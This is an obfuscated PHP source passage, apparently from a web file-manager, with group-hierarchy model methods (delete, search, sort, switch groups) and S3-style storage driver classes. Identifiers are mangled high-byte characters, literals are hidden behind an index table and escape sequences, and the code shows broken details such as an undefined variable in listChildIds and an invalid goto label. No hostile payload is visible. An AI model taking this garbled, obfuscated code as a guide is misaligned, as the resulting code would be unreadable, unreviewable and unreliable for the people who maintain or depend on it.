$ÀÈû¼Ğ¿ = array($…‡´ğßÖ[1497] => $ãÄ—Êñ); $Ê­„îùŠ = $this->where($ÀÈû¼Ğ¿)->find(); if (!$Ê­„îùŠ || $Ê­„îùŠ[$…‡´ğßÖ[190]] == 0) { return !1; } if (!$á»ûšü) { $‚ıóïñô = $this->getInfoSimple($Ê­„îùŠ[$…‡´ğßÖ[190]]); $this->_changeChildLevel($Ê­„îùŠ, $‚ıóïñô, !0); $this->where(array($…‡´ğßÖ[190] => $ãÄ—Êñ))->save(array($…‡´ğßÖ[190] => $Ê­„îùŠ[$…‡´ğßÖ[190]])); $this->_clearCache($‚ıóïñô[$…‡´ğßÖ[1497]]); } Model($…‡´ğßÖ[2278])->where($ÀÈû¼Ğ¿)->delete(); Model($…‡´ğßÖ[2279])->where($ÀÈû¼Ğ¿)->delete(); Model($…‡´ğßÖ[934])->groupRootRemove($ãÄ—Êñ); $this->_clearCache($Ê­„îùŠ[$…‡´ğßÖ[190]]); return $this->where($ÀÈû¼Ğ¿)->delete(); } protected function groupSort($»ïä™¥‰) { $—ò­áë² =& $_SERVER[ïÃ°£«Ê]; $çÍòî¨Ä = array(); foreach ($»ïä™¥‰ as $Å¥½•øÄ => $¡´õâ—ª) { $çÍòî¨Ä[] = array($—ò­áë²[1497], $¡´õâ—ª, $—ò­áë²[2207], $Å¥½•øÄ + 1); } $this->saveAll($çÍòî¨Ä); } public function listData() { $Ü­…óØÃ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ü­…óØÃ[$_SERVER[ïÃ°£«Ê][446]]); return $Ü­…óØÃ; } private function _makeOrder($ÎŞ«ÙÆş = '') { $ªìŞå¡— =& $_SERVER[ïÃ°£«Ê]; $İ–¡°€İ = array($ªìŞå¡—[1497], $ªìŞå¡—[32], $ªìŞå¡—[2173], $ªìŞå¡—[231]); $õ·¹Å“à = array($ªìŞå¡—[537] => $ªìŞå¡—[538], $ªìŞå¡—[539] => $ªìŞå¡—[540]); $®•ƒ¢Ä = Input::get($ªìŞå¡—[544], $ªìŞå¡—[7], $ªìŞå¡—[2189], $İ–¡°€İ); $¼¿Û–Õ = Input::get($ªìŞå¡—[545], $ªìŞå¡—[7], $ªìŞå¡—[2280], array($ªìŞå¡—[2280], $ªìŞå¡—[539])); $¼¿Û–Õ = $õ·¹Å“à[$¼¿Û–Õ]; $ÎŞ«ÙÆş = $ÎŞ«ÙÆş . "{$®•ƒ¢Ä}\40{$¼¿Û–Õ}\x2c\40\147\162\x6f\165\160\x49\104\x20\141\x73\143"; return $this->order($ÎŞ«ÙÆş); } public function listChild($©‘ö´æ²) { $İ÷µµ¸Ë =& $_SERVER[ïÃ°£«Ê]; $å¥Òà¸¸ = $this->where(array($İ÷µµ¸Ë[190] => $©‘ö´æ²))->_makeOrder()->selectPage(200); $this->_listDataApply($å¥Òà¸¸[$İ÷µµ¸Ë[446]]); return $å¥Òà¸¸; } public function listChildIds($Îœ°º§ğ) { $·çñÒŞí =& $_SERVER[ïÃ°£«Ê]; if (is_string($÷±Ï¦È³)) { $Îœ°º§ğ = explode($·çñÒŞí[50], $Îœ°º§ğ); } $Ç­æ´î‘ = $this->where(array($·çñÒŞí[1497] => array($·çñÒŞí[7], $Îœ°º§ğ)))->field($·çñÒŞí[2281])->select(); if (!$Ç­æ´î‘) { return !1; } $èá¨å‘ = array(); foreach ($Ç­æ´î‘ as $Ì¥§ÂÂ) { $èá¨å‘[] = "\163\x65\x6c\x65\x63\164\40\147\162\157\165\160\x49\x44\40\146\162\x6f\x6d\x20\140\147\162\157\165\160\x60\x20\x77\x68\145\162\145\x20\160\x61\x72\145\156\164\x4c\145\166\x65\154\x20\x6c\x69\x6b\x65\40\47{$Ì¥§ÂÂ[$·çñÒŞí[604]]}{$Ì¥§ÂÂ[$·çñÒŞí[1497]]}\54\x25\x27"; } $èá¨å‘ = implode($·çñÒŞí[2282], $èá¨å‘); $Ç­æ´î‘ = $this->query($èá¨å‘); if (!$Ç­æ´î‘) { return array(); } $Îœ°º§ğ = array_to_keyvalue($Ç­æ´î‘, $·çñÒŞí[12], $·çñÒŞí[1497]); return array_unique($Îœ°º§ğ); } public function listByID($†İÎıï) { $è²ÚŞÍ =& $_SERVER[ïÃ°£«Ê]; if (!$†İÎıï) { return array(); } $Ù¬ºØ“¬ = array($è²ÚŞÍ[1497] => array($è²ÚŞÍ[7], $†İÎıï)); $à‡Â‘ÃÁ = $this->where($Ù¬ºØ“¬)->select(); $à‡Â‘ÃÁ = array_sort_keep($à‡Â‘ÃÁ, $è²ÚŞÍ[1497], $†İÎıï); $this->_listDataApply($à‡Â‘ÃÁ); return $à‡Â‘ÃÁ; } public function listSearch($µ„“õ«) { $ëñü°–” =& $_SERVER[ïÃ°£«Ê]; $ã¬ö·À = trim($µ„“õ«[$ëñü°–”[2283]]); $×•“üÌÚ = explode($ëñü°–”[53], $ã¬ö·À); if (!$ã¬ö·À || count($×•“üÌÚ) == 1) { return $this->listSearchNow($µ„“õ«); } $‡óºÛ‡ = array($ëñü°–”[446] => array()); foreach ($×•“üÌÚ as $áş¥Æ†ğ) { if (!trim($áş¥Æ†ğ)) { continue; } $µ„“õ«[$ëñü°–”[2283]] = $áş¥Æ†ğ; $ĞŸ˜°¯È = $this->listSearchNow($µ„“õ«); $‡óºÛ‡[$ëñü°–”[446]] = array_merge($‡óºÛ‡[$ëñü°–”[446]], $ĞŸ˜°¯È[$ëñü°–”[446]]); } $‡óºÛ‡[$ëñü°–”[446]] = array_unique_by_key($‡óºÛ‡[$ëñü°–”[446]], $ëñü°–”[1497]); $‡óºÛ‡[$ëñü°–”[443]] = array($ëñü°–”[444] => count($‡óºÛ‡[$ëñü°–”[446]]), $ëñü°–”[439] => 20, $ëñü°–”[428] => 1, $ëñü°–”[445] => 1); return $‡óºÛ‡; } public function listSearchNow($—–Ò“¾‡) { $ˆ«é§äÍ =& $_SERVER[ïÃ°£«Ê]; $°ÒÂ˜«™ = trim($—–Ò“¾‡[$ˆ«é§äÍ[2283]]); $»ë¼™ = isset($—–Ò“¾‡[$ˆ«é§äÍ[2284]]) ? $—–Ò“¾‡[$ˆ«é§äÍ[2284]] : !1; if (!trim($°ÒÂ˜«™)) { return !1; } $°ÒÂ˜«™ = str_replace($ˆ«é§äÍ[2285], $ˆ«é§äÍ[2286], $°ÒÂ˜«™); $±¬ßŞåÌ = array($ˆ«é§äÍ[1497] => array($ˆ«é§äÍ[473], "{$°ÒÂ˜«™}\x25"), $ˆ«é§äÍ[32] => array($ˆ«é§äÍ[473], "\45{$°ÒÂ˜«™}\45"), $ˆ«é§äÍ[1168] => $ˆ«é§äÍ[2287]); if ($»ë¼™) { $‚š§«ü¡ = $this->getInfoSimple($»ë¼™); $Ç ôàª± = $‚š§«ü¡[$ˆ«é§äÍ[604]] . $»ë¼™ . $ˆ«é§äÍ[636]; $±¬ßŞåÌ = array($±¬ßŞåÌ, array($ˆ«é§äÍ[604] => array($ˆ«é§äÍ[473], $Ç ôàª±))); } $±¬ßŞåÌ = $this->parseWhereLike($±¬ßŞåÌ); $„‰Ÿ™Ø = $this->_makeOrder()->where($±¬ßŞåÌ)->selectPage(20); $„‰Ÿ™Ø = $„‰Ÿ™Ø ? $„‰Ÿ™Ø : array($ˆ«é§äÍ[446] => array(), $ˆ«é§äÍ[443] => array()); if (!$„‰Ÿ™Ø || count($„‰Ÿ™Ø[$ˆ«é§äÍ[446]]) < 5 && Input::check($°ÒÂ˜«™, $ˆ«é§äÍ[393])) { $Ì¬ÚÛ¢ê = $this->groupChildrenAll($»ë¼™); $÷Œ¡Ê» = $this->_searchFromMeta($ˆ«é§äÍ[551], $°ÒÂ˜«™, 10, $Ì¬ÚÛ¢ê); $ï¯¯ÙğØ = $this->_searchFromMeta($ˆ«é§äÍ[552], $°ÒÂ˜«™, 10, $Ì¬ÚÛ¢ê); $êôŒÜœÌ = array_merge($÷Œ¡Ê», $ï¯¯ÙğØ, $„‰Ÿ™Ø[$ˆ«é§äÍ[446]]); $„‰Ÿ™Ø[$ˆ«é§äÍ[446]] = array_unique_by_key($êôŒÜœÌ, $ˆ«é§äÍ[1497]); $„‰Ÿ™Ø[$ˆ«é§äÍ[443]][$ˆ«é§äÍ[444]] = count($„‰Ÿ™Ø[$ˆ«é§äÍ[446]]); $„‰Ÿ™Ø[$ˆ«é§äÍ[443]][$ˆ«é§äÍ[445]] = ceil($„‰Ÿ™Ø[$ˆ«é§äÍ[443]][$ˆ«é§äÍ[444]] / $„‰Ÿ™Ø[$ˆ«é§äÍ[443]][$ˆ«é§äÍ[439]]); } $this->_listDataApply($„‰Ÿ™Ø[$ˆ«é§äÍ[446]]); return $„‰Ÿ™Ø; } protected function groupChildrenAll($…‡İ·) { $Ú™ÊŞİı =& $_SERVER[ïÃ°£«Ê]; if (!$…‡İ·) { return !1; } if (!is_array($…‡İ·)) { $…‡İ· = array($…‡İ·); } $¶ÜÂ÷ƒß = $…‡İ·; foreach ($…‡İ· as $—À™ú³Î) { $¶›¹¾¡ = $this->getInfoSimple($—À™ú³Î); $¤øı”Äñ = array($Ú™ÊŞİı[604] => array($Ú™ÊŞİı[473], $¶›¹¾¡[$Ú™ÊŞİı[604]] . $—À™ú³Î . $Ú™ÊŞİı[636])); $ÌäÚîÑ€ = $this->field($Ú™ÊŞİı[1497])->where($¤øı”Äñ)->select(); $¶ÜÂ÷ƒß = array_merge($¶ÜÂ÷ƒß, array_to_keyvalue($ÌäÚîÑ€, $Ú™ÊŞİı[12], $Ú™ÊŞİı[1497])); } return array_unique($¶ÜÂ÷ƒß); } private function _searchFromMeta($‹òÒ¡‚, $ê”ã—‡«, $ÃŒĞñòò, $ù¶óœ±è) { $ã«ÊÀ¿Æ =& $_SERVER[ïÃ°£«Ê]; $ê”ã—‡« = strtolower($ê”ã—‡«); $¿âœº˜ = array($ã«ÊÀ¿Æ[95] => $‹òÒ¡‚, $ã«ÊÀ¿Æ[451] => array($ã«ÊÀ¿Æ[473], "\45{$ê”ã—‡«}\x25")); $¿âœº˜ = $this->parseWhereLike($¿âœº˜); if ($ù¶óœ±è) { $¿âœº˜[$ã«ÊÀ¿Æ[1497]] = array($ã«ÊÀ¿Æ[7], $ù¶óœ±è); } $ª²Äæ¢’ = Model($ã«ÊÀ¿Æ[2288])->where($¿âœº˜)->limit($ÃŒĞñòò)->select(); if (!$ª²Äæ¢’) { return array(); } $ª²Äæ¢’ = array_to_keyvalue($ª²Äæ¢’, $ã«ÊÀ¿Æ[12], $ã«ÊÀ¿Æ[1497]); $•”üª¤± = $this->where(array($ã«ÊÀ¿Æ[2272] => array($ã«ÊÀ¿Æ[7], $ª²Äæ¢’)))->select(); if (!$•”üª¤±) { return array(); } return $•”üª¤±; } protected function _listDataApplyItem($‚šÖö¬ø) { $¨ÏÑ³ƒè = array($‚šÖö¬ø); $this->_listDataApply($¨ÏÑ³ƒè); return $¨ÏÑ³ƒè[0]; } protected function _listDataApply(&$­ìñæ©€) { $ìÚ©¿ê =& $_SERVER[ïÃ°£«Ê]; if (!$­ìñæ©€) { return; } $„“ë‹•ş = array_to_keyvalue($­ìñæ©€, $ìÚ©¿ê[12], $ìÚ©¿ê[1497]); $this->_listAppendChildren($­ìñæ©€); $this->_listAppendChildrenMember($­ìñæ©€); $this->_listAppendMeta($­ìñæ©€, $„“ë‹•ş); $this->_listAppendParent($­ìñæ©€); $this->_listAppendSourceRoot($­ìñæ©€, $„“ë‹•ş); } private function _listAppendChildren(&$¿Šû•Â) { $ã¹°¨Ë =& $_SERVER[ïÃ°£«Ê]; $ºøÀäğ = array_to_keyvalue($¿Šû•Â, $ã¹°¨Ë[12], $ã¹°¨Ë[1497]); $µó×å— = array($ã¹°¨Ë[190] => array($ã¹°¨Ë[7], $ºøÀäğ)); $¾‰—ìŞ— = array($ã¹°¨Ë[190], $ã¹°¨Ë[2289] => $ã¹°¨Ë[585]); $æ²¶ó© = $this->field($¾‰—ìŞ—)->where($µó×å—)->group($ã¹°¨Ë[190])->select(); $ŒÈ€©ïı = array_to_keyvalue($æ²¶ó©, $ã¹°¨Ë[190], $ã¹°¨Ë[585]); foreach ($¿Šû•Â as &$”Ò¶÷·) { $‚¬®³° = $”Ò¶÷·[$ã¹°¨Ë[1497]]; $”Ò¶÷·[$ã¹°¨Ë[2290]] = isset($ŒÈ€©ïı[$‚¬®³°]) ? intval($ŒÈ€©ïı[$‚¬®³°]) : !1; } unset($”Ò¶÷·); } private function _listAppendChildrenMember(&$âì†š•µ) { $Æë›çƒ =& $_SERVER[ïÃ°£«Ê]; $¦ß·äÕ¬ = array_to_keyvalue($âì†š•µ, $Æë›çƒ[12], $Æë›çƒ[1497]); $ñ‹ó¯úÃ = array($Æë›çƒ[1497] => array($Æë›çƒ[7], $¦ß·äÕ¬)); $•ØçÚÄ = array($Æë›çƒ[1497], $Æë›çƒ[2289] => $Æë›çƒ[585]); $ğäƒÀøŞ = Model($Æë›çƒ[2279])->field($•ØçÚÄ)->where($ñ‹ó¯úÃ)->group($Æë›çƒ[1497])->select(); $ï„à³ò£ = array_to_keyvalue($ğäƒÀøŞ, $Æë›çƒ[1497], $Æë›çƒ[585]); foreach ($âì†š•µ as &$ÑöÂÔ‰) { $¬¨Ú­­ô = $ÑöÂÔ‰[$Æë›çƒ[1497]]; $ÑöÂÔ‰[$Æë›çƒ[2291]] = isset($ï„à³ò£[$¬¨Ú­­ô]) ? intval($ï„à³ò£[$¬¨Ú­­ô]) : !1; } unset($ÑöÂÔ‰); } private function _listAppendMeta(&$èíŒ¸÷Š, $Ş¢˜åÊ) { $ À¨şı¬ =& $_SERVER[ïÃ°£«Ê]; $ˆ‰ÂòÚÆ = array($ À¨şı¬[1497] => array($ À¨şı¬[7], $Ş¢˜åÊ)); $³Éæ€õ = Model($ À¨şı¬[2278])->where($ˆ‰ÂòÚÆ)->select(); $³Éæ€õ = array_to_keyvalue_group($³Éæ€õ, $ À¨şı¬[1497]); foreach ($³Éæ€õ as &$ÏË»ßÔ˜) { $ÏË»ßÔ˜ = array_to_keyvalue($ÏË»ßÔ˜, $ À¨şı¬[95], $ À¨şı¬[451]); } unset($ÏË»ßÔ˜); foreach ($èíŒ¸÷Š as &$­ØáÏÖ) { $­ØáÏÖ[$ À¨şı¬[555]] = array(); if (isset($³Éæ€õ[$­ØáÏÖ[$ À¨şı¬[1497]]])) { $­ØáÏÖ[$ À¨şı¬[555]] = $³Éæ€õ[$­ØáÏÖ[$ À¨şı¬[1497]]]; } } unset($­ØáÏÖ); } protected function parentLevelArray($¿¯ìõùŸ) { $Çß­ÎÃ =& $_SERVER[ïÃ°£«Ê]; $¿¯ìõùŸ = explode($Çß­ÎÃ[50], trim($¿¯ìõùŸ, $Çß­ÎÃ[50])); $¿¯ìõùŸ = array_remove_value($¿¯ìõùŸ, $Çß­ÎÃ[228]); return $¿¯ìõùŸ; } protected function parentInGroup($ƒé…¼ÃÊ, $£šçÊÇä) { $ÏĞéÑ¡Ì =& $_SERVER[ïÃ°£«Ê]; $®Îí = $this->getInfoSimple($ƒé…¼ÃÊ); if (!$®Îí) { return !0; } $šáã—Æé = $this->parentLevelArray($®Îí[$ÏĞéÑ¡Ì[604]]); $šáã—Æé[] = $ƒé…¼ÃÊ; foreach ($šáã—Æé as $ƒé…¼ÃÊ) { if (in_array($ƒé…¼ÃÊ . $ÏĞéÑ¡Ì[12], $£šçÊÇä)) { return !0; } } return !1; } private function _listAppendParent(&$áßí‡†—) { $–‚À×ş‹ =& $_SERVER[ïÃ°£«Ê]; $ºŸ°Î‚ = array(); foreach ($áßí‡†— as &$©§şğ‰ü) { $ºŸ°Î‚[$©§şğ‰ü[$–‚À×ş‹[1497]]] = $©§şğ‰ü[$–‚À×ş‹[32]]; $Éçì‚òº = $this->parentLevelArray($©§şğ‰ü[$–‚À×ş‹[604]]); foreach ($Éçì‚òº as $ı”·ĞÅ½) { if (!isset($ºŸ°Î‚[$ı”·ĞÅ½])) { $ºŸ°Î‚[$ı”·ĞÅ½] = 0; } } } unset($©§şğ‰ü); foreach ($ºŸ°Î‚ as $¤®³Œ  => $Î¨úÖà) { if ($Î¨úÖà) { continue; } $™‘£ş¿ = $this->getInfoSimple($¤®³Œ ); $ºŸ°Î‚[$¤®³Œ ] = $™‘£ş¿[$–‚À×ş‹[32]]; } $ƒ†çòÉù = $GLOBALS[$–‚À×ş‹[6]][$–‚À×ş‹[92]][$–‚À×ş‹[2292]]; if (KodUser::isRoot()) { $ƒ†çòÉù = !1; } foreach ($áßí‡†— as &$©§şğ‰ü) { $Éçì‚òº = $this->parentLevelArray($©§şğ‰ü[$–‚À×ş‹[604]]); $èš‚î­½ = $–‚À×ş‹[12]; foreach ($Éçì‚òº as $¤®³Œ  => $ı”·ĞÅ½) { if ($ƒ†çòÉù && $¤®³Œ  == 0) { continue; } $èš‚î­½ .= $ºŸ°Î‚[$ı”·ĞÅ½] . $–‚À×ş‹[8]; } if ($Éçì‚òº) { $èš‚î­½ .= $©§şğ‰ü[$–‚À×ş‹[32]]; } $©§şğ‰ü[$–‚À×ş‹[609]] = str_replace($–‚À×ş‹[254], $–‚À×ş‹[8], $èš‚î­½); } unset($©§şğ‰ü); } private function _listAppendSourceRoot(&$ÀÍÇ˜ëç, $ƒõóÊ«‡) { $©Ç¿Æğº =& $_SERVER[ïÃ°£«Ê]; $»­‰±‘ = Model($©Ç¿Æğº[934])->listSourceRoot(SourceModel::TYPE_GROUP, $ƒõóÊ«‡); $»­‰±‘ = array_to_keyvalue($»­‰±‘, $©Ç¿Æğº[589]); $»­‰±‘ = array_remove_key($»­‰±‘, $©Ç¿Æğº[589]); foreach ($ÀÍÇ˜ëç as &$„‚ñ«áı) { $„‚ñ«áı[$©Ç¿Æğº[90]] = $»­‰±‘[$„‚ñ«áı[$©Ç¿Æğº[1497]]] ? $»­‰±‘[$„‚ñ«áı[$©Ç¿Æğº[1497]]] : array(); } unset($„‚ñ«áı); } protected function groupMerge($ËÅ´–°õ) { $ËÅ´–°õ = array_values(array_unique($ËÅ´–°õ)); $‘¡ÔË¸ = array(); for ($—òóÕĞï = 0; $—òóÕĞï < count($ËÅ´–°õ); $—òóÕĞï++) { $îæ´¥Òû = !1; for ($£ëªÚ‰¦ = 0; $£ëªÚ‰¦ < count($ËÅ´–°õ); $£ëªÚ‰¦++) { if ($—òóÕĞï == $£ëªÚ‰¦) { continue; } if ($this->isParentOf($ËÅ´–°õ[$£ëªÚ‰¦], $ËÅ´–°õ[$—òóÕĞï])) { $îæ´¥Òû = !0; break; } } if (!$îæ´¥Òû) { $‘¡ÔË¸[] = $ËÅ´–°õ[$—òóÕĞï]; } } return $‘¡ÔË¸; } protected function isParentOf($İ¶Ï¸¨Á, $ˆÑÄ—ô÷) { $ÕÈÌÌù” =& $_SERVER[ïÃ°£«Ê]; if (!$İ¶Ï¸¨Á || !$ˆÑÄ—ô÷ || $İ¶Ï¸¨Á == $ˆÑÄ—ô÷) { return !1; } $“û®ïï‹ = $this->getInfoSimple($İ¶Ï¸¨Á); $ÒŠÂø¬ = $this->getInfoSimple($ˆÑÄ—ô÷); $Õº»ÒÄ = $“û®ïï‹[$ÕÈÌÌù”[604]] . $İ¶Ï¸¨Á . $ÕÈÌÌù”[50]; if (substr($ÒŠÂø¬[$ÕÈÌÌù”[604]], 0, strlen($Õº»ÒÄ)) == $Õº»ÒÄ) { return !0; } return !1; } public function groupShowRoot($”¶µÁ‘, $¬˜¡×ø = false) { $±ü×ü© =& $_SERVER[ïÃ°£«Ê]; $ƒ¶šï’ë = $this->getInfo($”¶µÁ‘); if (!$ƒ¶šï’ë) { return array(); } $°³‹Ñ±· = $this->parentLevelArray($ƒ¶šï’ë[$±ü×ü©[604]]); $îÔÖ‘”Ø = array($”¶µÁ‘); if (count($°³‹Ñ±·) == 0) { return $îÔÖ‘”Ø; } if ($¬˜¡×ø && count($°³‹Ñ±·) == 1) { return $îÔÖ‘”Ø; } if (!$ƒ¶šï’ë[$±ü×ü©[555]] || !isset($ƒ¶šï’ë[$±ü×ü©[555]][$±ü×ü©[2273]]) || $ƒ¶šï’ë[$±ü×ü©[555]][$±ü×ü©[2273]] == $±ü×ü©[945]) { return $this->groupShowRoot($°³‹Ñ±·[count($°³‹Ñ±·) - 1], $¬˜¡×ø); } if ($ƒ¶šï’ë[$±ü×ü©[555]][$±ü×ü©[2273]] == $±ü×ü©[432]) { $›ËÙ¡¤ƒ = explode($±ü×ü©[50], $ƒ¶šï’ë[$±ü×ü©[555]][$±ü×ü©[2274]]); if ($›ËÙ¡¤ƒ) { $îÔÖ‘”Ø = array_merge($îÔÖ‘”Ø, $›ËÙ¡¤ƒ); } } return $îÔÖ‘”Ø; } protected function resetParentLevel() { $ñØ†çôı =& $_SERVER[ïÃ°£«Ê]; $¤åêÚ«È = $ñØ†çôı[1497]; $ø´¶¬¼¸ = $this->select(); $ø´¶¬¼¸ = array_to_keyvalue($ø´¶¬¼¸, $¤åêÚ«È); foreach ($ø´¶¬¼¸ as $ú½ƒ×¸) { $ÂéõÏÉå = $ú½ƒ×¸; $üİ´äã½ = array(); while ($ÂéõÏÉå[$ñØ†çôı[190]] != 0) { $üİ´äã½[] = $ÂéõÏÉå[$ñØ†çôı[190]]; $ÂéõÏÉå = $ø´¶¬¼¸[$ÂéõÏÉå[$ñØ†çôı[190]]]; } $üİ´äã½[] = 0; $üİ´äã½ = $ñØ†çôı[50] . implode($ñØ†çôı[50], array_reverse($üİ´äã½)) . $ñØ†çôı[50]; $this->setNamePinyin($ú½ƒ×¸[$¤åêÚ«È], $ú½ƒ×¸[$ñØ†çôı[32]]); $this->where(array($¤åêÚ«È => $ú½ƒ×¸[$¤åêÚ«È]))->save(array($ñØ†çôı[674] => $üİ´äã½)); } return $ø´¶¬¼¸; } public function groupNameAuto($á›èÜú, $é¹ç…’Ó) { $ş†ç =& $_SERVER[ïÃ°£«Ê]; $ÙıÉ£µ¢ = $this->where(array($ş†ç[492] => $á›èÜú))->getField($ş†ç[32], !0); if (!$ÙıÉ£µ¢ || !in_array($é¹ç…’Ó, $ÙıÉ£µ¢)) { return $é¹ç…’Ó; } for ($ˆÙ•×«ß = 1; $ˆÙ•×«ß <= count($ÙıÉ£µ¢) + 1; $ˆÙ•×«ß++) { $êñµ¬é = $é¹ç…’Ó . "\50{$ˆÙ•×«ß}\x29"; if (!in_array($êñµ¬é, $ÙıÉ£µ¢)) { return $êñµ¬é; } } } public function groupSwitch($íôíİìœ, $ûîÙÄ±ß) { $³ŠÜµì =& $_SERVER[ïÃ°£«Ê]; $˜—íÙø = array($³ŠÜµì[1497] => array($³ŠÜµì[7], array($íôíİìœ, $ûîÙÄ±ß))); $Ò±“ôò› = $this->where($˜—íÙø)->select(); $Ò±“ôò› = array_to_keyvalue($Ò±“ôò›, $³ŠÜµì[1497]); $›øí¢‘× = _get($Ò±“ôò›, $íôíİìœ); $çÁ÷ª¤ğ = _get($Ò±“ôò›, $ûîÙÄ±ß); if (!$›øí¢‘× || !$çÁ÷ª¤ğ || $›øí¢‘×[$³ŠÜµì[190]] == 0) { return !1; } if ($›øí¢‘×[$³ŠÜµì[1497]] == $çÁ÷ª¤ğ[$³ŠÜµì[1497]]) { return !1; } if (strpos($çÁ÷ª¤ğ[$³ŠÜµì[604]], $›øí¢‘×[$³ŠÜµì[604]] . $›øí¢‘×[$³ŠÜµì[1497]] . $³ŠÜµì[50]) === 0) { return !1; } $˜—íÙø = array($³ŠÜµì[1497] => $íôíİìœ); $ú Ø†† = Model($³ŠÜµì[2279])->where($˜—íÙø)->select(); if (!$ú Ø††) { $ú Ø†† = array(); } foreach ($ú Ø†† as $½ş¾˜€Ö) { $Ä÷Ë”ï¸ = $½ş¾˜€Ö[$³ŠÜµì[1594]]; $˜—íÙø = array($³ŠÜµì[1594] => $Ä÷Ë”ï¸, $³ŠÜµì[1497] => $ûîÙÄ±ß); $¬Ü®¯³‘ = Model($³ŠÜµì[2279])->where($˜—íÙø)->find(); if (!$¬Ü®¯³‘) { $Ä™¢ÍĞÎ = array($ûîÙÄ±ß => $½ş¾˜€Ö[$³ŠÜµì[1642]]); Model($³ŠÜµì[617])->userGroupAdd($Ä÷Ë”ï¸, $Ä™¢ÍĞÎ); } Model($³ŠÜµì[617])->userGroupRemove($Ä÷Ë”ï¸, $íôíİìœ); } $˜—íÙø = array($³ŠÜµì[188] => 2, $³ŠÜµì[190] => 0, $³ŠÜµì[500] => 1, $³ŠÜµì[589] => array($³ŠÜµì[7], array($íôíİìœ, $ûîÙÄ±ß))); $Éš‚Ášî = Model($³ŠÜµì[934])->where($˜—íÙø)->field($³ŠÜµì[2293])->select(); $Éš‚Ášî = array_to_keyvalue($Éš‚Ášî, $³ŠÜµì[589], $³ŠÜµì[191]); $úğ¡®” = !empty($Éš‚Ášî[$íôíİìœ]) ? $Éš‚Ášî[$íôíİìœ] : !1; if ($úğ¡®”) { if (!$Éš‚Ášî[$ûîÙÄ±ß]) { $Éš‚Ášî[$ûîÙÄ±ß] = Model($³ŠÜµì[934])->groupRootAdd($ûîÙÄ±ß); } $âõÏ™Â = $Éš‚Ášî[$ûîÙÄ±ß]; $˜—íÙø = array($³ŠÜµì[190] => $úğ¡®”); $Éš‚Ášî = Model($³ŠÜµì[934])->where($˜—íÙø)->field($³ŠÜµì[2294])->select(); if (!$Éš‚Ášî) { $Éš‚Ášî = array(); } Model($³ŠÜµì[934])->moveClearAuth = !1; foreach ($Éš‚Ášî as $×ëåÊç×) { $‘…ğÔ = $×ëåÊç×[$³ŠÜµì[500]] == $³ŠÜµì[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($³ŠÜµì[934])->move($×ëåÊç×[$³ŠÜµì[191]], $âõÏ™Â, $‘…ğÔ); } Model($³ŠÜµì[934])->moveClearAuth = !0; $˜—íÙø = array($³ŠÜµì[188] => 2, $³ŠÜµì[589] => $íôíİìœ); $ü¬ìœ”¤ = array($³ŠÜµì[589] => $ûîÙÄ±ß); Model($³ŠÜµì[2295])->where($˜—íÙø)->save($ü¬ìœ”¤); Model($³ŠÜµì[2296])->where($˜—íÙø)->save($ü¬ìœ”¤); } $this->_changeChildLevel($Ò±“ôò›[$íôíİìœ], $Ò±“ôò›[$ûîÙÄ±ß], !0); $this->where(array($³ŠÜµì[190] => $íôíİìœ))->save(array($³ŠÜµì[190] => $ûîÙÄ±ß)); $this->_clearChildrenCache($Ò±“ôò›[$ûîÙÄ±ß]); return !0; } } goto d „İÅÖ¨„; cÊàšá¤å›: class PathDriverBOS extends PathDriverS3 { public function __construct($½¤µäÊ) { parent::__construct($½¤µäÊ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($âÄã½›) { parent::__construct($âÄã½›); $this->setSignVersion($_SERVER[ïÃ°£«Ê][247]); } public function uploadFormData($¾Çê€Ëö, $ÕÖ‘¶ú = 3600) { $„ñƒ¿šÅ =& $_SERVER[ïÃ°£«Ê]; $‡›íÌÖ÷ = $„ñƒ¿šÅ[229]; $Ó£øöÍß = $„ñƒ¿šÅ[1526]; $½ÖÄÜ˜÷ = $„ñƒ¿šÅ[261]; $â¤‘åëÇ = gmdate($„ñƒ¿šÅ[1527], time() + $ÕÖ‘¶ú); $ÏÈõ÷ö¼ = (string) time() . $„ñƒ¿šÅ[74] . (string) (time() + $ÕÖ‘¶ú); $’Ê’¼şë = array($„ñƒ¿šÅ[262] => $â¤‘åëÇ, $„ñƒ¿šÅ[265] => array(array($„ñƒ¿šÅ[306] => $‡›íÌÖ÷), array($„ñƒ¿šÅ[266] => $this->bucket), array($„ñƒ¿šÅ[267], $„ñƒ¿šÅ[268], $„ñƒ¿šÅ[12]), array($„ñƒ¿šÅ[270] => $½ÖÄÜ˜÷), array($„ñƒ¿šÅ[1528] => $Ó£øöÍß), array($„ñƒ¿šÅ[1529] => $this->accessKey), array($„ñƒ¿šÅ[1530] => $ÏÈõ÷ö¼))); $’Ê’¼şë = json_encode($’Ê’¼şë); $„Î˜Ø… = hash_hmac($„ñƒ¿šÅ[1526], $ÏÈõ÷ö¼, $this->secret); $¨Ñ·ÛÜÆ = sha1($’Ê’¼şë); $í¸æ½Äß = hash_hmac($„ñƒ¿šÅ[1526], $¨Ñ·ÛÜÆ, $„Î˜Ø…); $ı¢ÄÆ· = array($„ñƒ¿šÅ[306] => $‡›íÌÖ÷, $„ñƒ¿šÅ[270] => $½ÖÄÜ˜÷, $„ñƒ¿šÅ[277] => base64_encode($’Ê’¼şë), $„ñƒ¿šÅ[1528] => $Ó£øöÍß, $„ñƒ¿šÅ[1529] => $this->accessKey, $„ñƒ¿šÅ[1531] => $ÏÈõ÷ö¼, $„ñƒ¿šÅ[1532] => $í¸æ½Äß, $„ñƒ¿šÅ[206] => $this->getHost()); return $ı¢ÄÆ·; } public function fileOutImage($€Ñ€½ã, $è½å­õ = 250) { $Ü·´Åüô =& $_SERVER[ïÃ°£«Ê]; if ($this->size($€Ñ€½ã) > 1024 * 1024 * 32) { return $this->fileOutImageServer($€Ñ€½ã, $è½å­õ); } $€üæ€æÕ = $this->link($€Ñ€½ã); $€üæ€æÕ .= $Ü·´Åüô[1533] . $è½å­õ . $Ü·´Åüô[1534]; $this->fileOutLink($€üæ€æÕ); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ÖûÌ ØÂ) { $this->pathParse = $ÖûÌ ØÂ; $this->model = Model($_SERVER[ïÃ°£«Ê][1535]); } public function getPath($ºÁÊâÅ‹) { return trim($ºÁÊâÅ‹, $_SERVER[ïÃ°£«Ê][8]); } public function pathFather($´€Œ¤) { $¦şÃ½Ùª = $this->parse($´€Œ¤); 